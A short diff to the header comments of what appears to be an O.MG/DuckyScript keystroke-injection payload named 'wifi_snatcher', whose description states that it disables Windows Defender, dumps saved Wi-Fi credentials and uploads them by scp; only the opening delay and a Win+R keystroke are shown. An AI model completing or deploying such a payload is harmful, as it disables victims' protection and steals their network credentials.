@@ -1,8 +1,9 @@
 REM --------------------------------------------------Payload-------------------------------------------------------
-REM Wifi snatch
-REM OMG script using hotkeys and run commands to kill windows defender, dump wifi and upload to wifi pager thru scp
-REM Windows 11
-REM f3bandit
+REM Name: wifi_snatcher
+REM Version: 3.0
+REM Description: OMG script using hotkeys and run commands to kill windows defender, dump wifi and upload to wifi pager thru scp
+REM Target OS: Windows 11
+REM Author: f3bandit
 REM ----------------------------------------------------------------------------------------------------------------
 DELAY 1000
 windows r
